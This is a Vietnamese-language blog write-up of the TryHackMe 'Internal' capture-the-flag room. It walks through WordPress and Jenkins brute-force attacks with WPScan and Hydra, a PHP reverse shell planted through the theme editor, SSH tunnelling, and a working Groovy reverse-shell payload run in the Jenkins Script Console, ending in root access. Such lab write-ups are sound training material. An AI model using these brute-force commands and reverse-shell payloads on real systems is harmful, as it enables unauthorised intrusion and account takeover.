---
layout: post
author: "Neo"
title: "Tryhackme - Internal"
date: "2021-12-05"
tags: [
    "tryhackme",
    "web",
    "linux",
    "ssh",
    "wordpress",
    "socat",
    "jenkins"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2021-12-05-THM-Internal/1.png)

Xin chào, Lẩu đây. Hôm nay tôi sẽ giải CTF [Tryhackme - Internal](https://tryhackme.com/room/internal)

## Reconnaissance

Vẫn như thông thường thôi, việc đầu tiên là quét các cổng dịch vụ đang mở.

```python
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFOI/P6nqicmk78vSNs4l+vk2+BQ0mBxB1KlJJPCYueaUExTH4Cxkqkpo/zJfZ77MHHDL5nnzTW+TO6e4mDMEw=
|   256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMlxubXGh//FE3OqdyitiEwfA2nNdCtdgLfDQxFHPyY0
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Thử check qua trang web, vì nó chỉ là 1 trang mặc định nên sau khi thử qua vài path cơ bản thì tôi sẽ tìm web path luôn.

![web path](/assets/img/2021-12-05-THM-Internal/2.png)

Vậy là trang này được build bằng Wordpress. Tuy nhiên khi thử vào blog thì nó hơi lạ

![site](/assets/img/2021-12-05-THM-Internal/3.png)

Vậy nên tôi đã thêm ip và domain vào file host để nó trở về trang php

![php-site](/assets/img/2021-12-05-THM-Internal/4.png)

Bây giờ thì thử dùng Wpscan xem có tìm được gì đặc biệt ở đây không.

```python
┌──(neo㉿kali)-[~]
└─$ wpscan --url http://internal.thm/blog/ -e u        
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.27.84]
[+] Started: Sat Aug 13 05:28:53 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <===============================================================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

Tôi thu được vài thông tin: Wordpress 5.4.2, themes đang dùng: twentyseventeen và nó chưa được update lên version mới nhất, cuối cùng là 1 user *admin*. Tôi sẽ bắt đầu thử từ phương pháp thủ công nhất là brute force.

```python
┌──(neo㉿kali)-[~]
└─$ wpscan --url http://internal.thm/blog/wp-login.php --usernames admin --passwords /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
...

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:42 <==============================================================================================================> (137 / 137) 100.00% Time: 00:00:42

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                                                  
Trying admin / lizzy Time: 00:07:19 <======                                                                                                            > (3880 / 63066)  6.15%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: *******

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

Login vào Wordpress thôi

![dashboard](/assets/img/2021-12-05-THM-Internal/5.png)

Bây giờ thì tìm đến themes và thử upload php shell. Tôi hay sử dụng php shell của [pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). 

![upload shell](/assets/img/2021-12-05-THM-Internal/6.png)

Sau khi đã 'Update File', tôi tạo listener với port 2402 giống như trong shell vừa upload. Sau đó truy cập vào file vừa sửa 

`http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 2402  
listening on [any] 2402 ...
connect to [10.18.3.74] from (UNKNOWN) [10.10.27.84] 50354
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:01:50 up  1:21,  0 users,  load average: 0.00, 0.00, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1107): Inappropriate ioctl for device
bash: no job control in this shell
www-data@internal:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@internal:/$ 
```

Vì đây là user web nên tôi sẽ thử vào thư mục web để tìm xem có gì hay ho không, thêm 1 điều nữa là bên chắc chắn bên trong thư mục web sẽ có file config của Wordpress nên biết đâu tôi sẽ tìm được user và password nào đó.

```python
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', '**************' );
```

Trong *wp-config.php* tôi tìm được user và pass để truy cập vào mysql. Tuy nhiên thì cũng không có gì đặc biệt để khai thác. Vậy nên tôi sẽ thử tìm kiếm xung quanh các thư mục trong *www-data*. 

```python
www-data@internal:/$ ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
```

Mất 1 lúc thì tôi đã tìm thấy thứ mình cần.

```python
www-data@internal:/opt$ ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:**************
```

Đổi sang user *aubreanna* và tôi có *user flag* ở đây.

```python
www-data@internal:/opt$ su aubreanna
Password: 
aubreanna@internal:/opt$ cd
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ 
```

## Privilege escalation

Việc đầu tiên tôi hay làm trong khâu này là sử dụng các phương pháp đươn giản trước như là `sudo -l` hay tìm các chương trình chạy bằng root, hay cả crontab nhưng đều không có kết quả.

Thử mở nốt file txt còn lại bên trong *aubreanna*

```python
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```

Tôi thử kiểm tra dịch vụ đang chạy với "netstat"

```python
aubreanna@internal:~$ netstat -tan | grep 8080
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN    
```

Jenkins đang chạy local với port 8080. Để truy cập được port này, tôi sẽ dùng __SSH tunneling__ để chuyển tiếp port 8080 sang 1 port của máy tôi. Từ đó tôi có thể truy cập vào localhost của target machine

```python
┌──(neo㉿kali)-[~]
└─$ ssh -L 2402:127.0.0.1:8080 aubreanna@10.10.51.65
```

Truy cập vào localhost với port 2402

![jenkins](/assets/img/2021-12-05-THM-Internal/7.png)

Sau khi thử các user-pass đơn giản đều không có kết quả, tôi vẫn phải dùng đến brute force, và lần này tôi dùng *hydra*. Nhưng trước đó phải dùng BurpSuite để lấy form đăng nhập.

![login-form](/assets/img/2021-12-05-THM-Internal/8.png)

Bây giờ thì thử brute force với username mặc định của Jenkins là *admin*

```python
┌──(neo㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt 127.0.0.1 -s 2402 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-14 06:08:39
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 59185 login tries (l:1/p:59185), ~3700 tries per task
[DATA] attacking http-post-form://127.0.0.1:2402/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[2402][http-post-form] host: 127.0.0.1   login: admin   password: *******
1 of 1 target successfully completed, 1 valid password found
```

Ô được luôn này :laughing:. Thử google 1 chút về jenkins và cách upload reverse shell, tôi biết được có thể upload payload bằng code java từ Groovy.

```python
String host="myip";
int port=12345;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Vào Jenkins > Manage Jenkins > Script Console và nhập đoạn code phía trên vào. À tuy nhiên trước đó thì phải tạo listener với port 12345: `nc -lnvp 1235`

![script-console](/assets/img/2021-12-05-THM-Internal/9.png)

```python
┌──(neo㉿kali)-[~]
└─$ nc -lnvp 12345                
listening on [any] 12345 ...
connect to [10.18.3.74] from (UNKNOWN) [10.10.51.65] 56774
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
ls
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
```

Lần này tôi thử vào */opt* luôn xem có gì trong này như lần đầu không.

```python
cd /opt/
ls
note.txt
cat note.txt 
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:****************
```

Thử đổi sang user *root*. À tôi quên mất đây chỉ là server jenkins nên tôi sẽ quay về target machine với user *aubreanna* và đổi sang *root*

```python
aubreanna@internal:~$ su root
Password: 
root@internal:/home/aubreanna# cd
root@internal:~# ls
root.txt  snap
root@internal:~# 
```

## Conclusion

Đúng là 1 machine cấp độ khó, đòi hỏi phải dùng kết hợp nhiều kỹ thuật và tôi cũng biết thêm được nhiều kiến thức mới từ bài này. 

Với phần leo thang đặc quyền tôi biết thêm về *ssh tunnelling*: cách điều hướng luồng dữ liệu từ 2 nơi giữa 2 địa chỉ độc lập. 

Tiếp nữa là tôi biết thêm về Jenkins - một công cụ mã nguồn mở dùng để tích hợp và tự động hóa code của các thành viên trong dự án và cách khai thác lỗ hổng thông qua Groovy script. 

Đọc thêm: 
- [SSH Tunneling](https://viblo.asia/p/ssh-tunneling-local-port-forwarding-va-remote-port-forwarding-07LKXJ3PlV4)
- [Cracking Online Web Form Passwords with THC-Hydra & Burp Suite](https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-online-web-form-passwords-with-thc-hydra-burp-suite-0160643/)
- [Jenkins - Reverse shell from Groovy](https://pentestbook.six2dez.com/enumeration/webservices/jenkins)

